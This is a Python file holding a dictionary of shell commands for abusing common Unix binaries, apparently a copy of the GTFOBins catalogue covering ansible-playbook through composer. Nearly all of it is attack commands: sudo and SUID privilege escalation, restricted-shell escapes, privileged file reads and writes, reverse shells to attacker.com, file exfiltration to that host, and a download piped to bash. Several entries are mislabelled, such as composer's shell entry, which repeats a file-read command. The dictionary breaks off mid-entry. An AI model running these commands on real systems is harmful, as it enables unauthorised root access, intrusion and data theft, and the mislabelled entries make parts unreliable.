#!/usr/bin/python
binaries = {
    'ansible_playbook':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nansible-playbook $TF"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF"}}
            },
    'apt-get':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"apt-get changelog apt\n!/bin/sh"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo apt-get changelog apt\n!/bin/sh",
                '2':"TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl",
                '3':"sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"}}
            },
    'apt':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"apt-get changelog apt\n!/bin/sh"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo apt-get changelog apt\n!/bin/sh",
                '2':"TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl",
                '3':"sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"}}
            },
    'ar':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"TF=$(mktemp -u)\nLFILE=file_to_read\nar r \"$TF\" \"$LFILE\"\ncat \"$TF\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which ar) .\n\nTF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\""}}
            },
    'aria2c':{
        'command':{
            'info':'It can be used to break out from restricted environments by running non-interactive system commands.',
            'exploits':{
                '1':"COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x",
                '2':"aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which aria2c) .\n\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x"}}
            },
    'arj':{
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\narj e \"$TF/a\" $LDIR"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"TF=$(mktemp -u)\nLFILE=file_to_read\narj a \"$TF\" \"$LFILE\"\narj p \"$TF\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which arj) .\n\nTF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR"}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR"}}
            },
    'arp':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\narp -v -f \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which arp) .\n\nLFILE=file_to_read\n./arp -v -f \"$LFILE\""}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"LFILE=file_to_read\nsudo arp -v -f \"$LFILE\""}}
            },
    'ash':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"ash"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'"}},
        'suid':{
            'info':"This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
            'exploits':{
                '1':"sudo install -m =xs $(which ash) .\n\n./ash"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ash"}}
            },
    'at':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null"}},
        'command':{
            'info':'It can be used to break out from restricted environments by running non-interactive system commands.',
            'exploits':{
                '1':"COMMAND=id\necho \"$COMMAND\" | at now"}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null"}}
            },
    'atobm':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\natobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which atobm) .\n\nLFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"}}
            },
    'awk':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"awk 'BEGIN {system(\"/bin/sh\")}'"}},
        'no_interactive_reverse':{
            'info':'It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n\ts = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n\twhile (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n\twhile (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"}},
        'no_interactive_bind':{
            'info':'It can bind a non-interactive shell to a local port to allow remote network access.',
            'exploits':{
                '1':"LPORT=12345\nawk -v LPORT=$LPORT 'BEGIN {\n\ts = \"/inet/tcp/\" LPORT \"/0/0\";\n\twhile (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n\twhile (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nawk '//' \"$LFILE\""}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which awk) .\n\nLFILE=file_to_read\n./awk '//' \"$LFILE\""}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo awk 'BEGIN {system(\"/bin/sh\")}'"}},
        'limited_suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which awk) .\n\n./awk 'BEGIN {system(\"/bin/sh\")}'"}},
            },
    'base32':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which base32) .\n\nLFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode"}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode"}}
            },
    'base64':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which base64) .\n\nLFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode"}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode"}}
            },
    'basenc':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which basenc) .\n\nLFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64"}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64"}}
            },
    'bash':{
        'shell':{   
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"bash"}},
        'reverse_shell':{
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\n\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'",
                '2':"export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'"}},
        'file_write':{   
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"export LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'",
                '2':"LFILE=file_to_write\nHISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w $LFILE"}},
        'file_read':{   
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"export LFILE=file_to_read\nbash -c 'echo \"$(<$LFILE)\"'"}},
        'library_load':{   
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"bash -c 'enable -f ./lib.so x'"}},
        'suid':{   
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which bash) .\n\n./bash -p"}},
        'sudo':{   
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo bash"}},
            },
    'bpftrace':{
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'",
                '2':"TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF",
                '3':"sudo bpftrace -c /bin/sh -e 'END {exit()}'"}}
            },
    'bridge':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nbridge -b \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which bridge) .\n\nLFILE=file_to_read\n./bridge -b \"$LFILE\""}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"LFILE=file_to_read\nsudo bridge -b \"$LFILE\""}}
            },
    'bundler':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"bundler help\n!/bin/sh",
                '2':"export BUNDLE_GEMFILE=x\nbundler exec /bin/sh",
                '3':"TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh",
                '4':"TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler console\nsystem('/bin/sh -c /bin/sh')",
                '5':"TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundler install"}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"sudo bundler help\n!/bin/sh"}}
             },
    'busctl':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"busctl --show-machine\n!/bin/sh"}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"sudo busctl --show-machine\n!/bin/sh"}}
            },
    'busybox':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"busybox sh"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"LPORT=12345\nbusybox httpd -f -p $LPORT -h ."}},
        'file_write':{
            'info':"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
            'exploits':{
                '1':"LFILE=file_to_write\nbusybox sh -c 'echo \"DATA\" > $LFILE'"}},
        'file_read':{
            'info':"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
            'exploits':{
                '1':"LFILE=file_to_read\n./busybox cat \"$LFILE\""}},
        'suid':{
            'info':"This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
            'exploits':{
                '1':"sudo install -m =xs $(which busybox) .\n./busybox sh"}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"sudo busybox sh"}}
            },
    'byebug':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue"}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue"}},
        'limited_suid':{
            'info':"This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
            'exploits':{
                '1':"sudo install -m =xs $(which byebug) .\n\nTF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue"}}
            },
    'c89':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"c89 -wrapper /bin/sh,-s ."}},
        'file_write':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"LFILE=file_to_delete\nc89 -xc /dev/null -o $LFILE"}},
        'file_read':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"LFILE=file_to_read\nc89 -x c -E \"$LFILE\""}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"sudo c89 -wrapper /bin/sh,-s ."}}
            },
    'c99':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"c99 -wrapper /bin/sh,-s ."}},
        'file_write':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"LFILE=file_to_delete\nc99 -xc /dev/null -o $LFILE"}},
        'file_read':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"LFILE=file_to_read\nc99 -x c -E \"$LFILE\""}},
        'sudo':{
            'info':"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
            'exploits':{
                '1':"sudo c99 -wrapper /bin/sh,-s ."}}
            },
    'cancel':{
        'file_uploads':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT"}}
            },
    'capsh':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"capsh --"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which capsh) .\n\n./capsh --gid=0 --uid=0 --"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo capsh --"}}
            },
    'cat':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ncat \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which cat) .\n\nLFILE=file_to_read\n./cat \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo cat \"$LFILE\""}}
            },
    'check_by_ssh':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"}}
            },
    'check_cups':{
        'file_read':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"LFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE"}}
            },
    'check_log':{
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nINPUT=input_file\ncheck_log -F $INPUT -O $LFILE"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nOUTPUT=output_file\ncheck_log -F $LFILE -O $OUTPUT\ncat $OUTPUT"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE"}}
            },
    'check_memory':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE"}}
            },
    'check_raid':{
        'file_read':{
            'info':'LFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE',
            'exploits':{
                '1':"LFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE"}}
            },
    'check_ssl_cert':{
        'command':{
            'info':'It can be used to break out from restricted environments by running non-interactive system commands.',
            'exploits':{
                '1':"COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT"}}
            },
    'check_statusfile':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ncheck_statusfile $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo check_statusfile $LFILE"}}
            },
    'chmod':{
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which chmod) .\n\nLFILE=file_to_change\n./chmod 6777 $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_change\nsudo chmod 6777 $LFILE"}}
            },
    'chown':{
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which chown) .\n\nLFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE"}}
            },
    'chroot':{
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which chroot) .\n\n./chroot / /bin/sh -p"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo chroot /"}}
            },
    'cmp':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ncmp $LFILE /dev/zero -b -l"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which cmp) .\n\nLFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l"}}
            },
    'cobc':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x"}}
            },
    'column':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ncolumn $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which column) .\n\nLFILE=file_to_read\n./column $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo column $LFILE"}}
            },
    'comm':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which comm) .\n\nLFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null"}}
            },
    'composer':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null"}},
        'suid':{
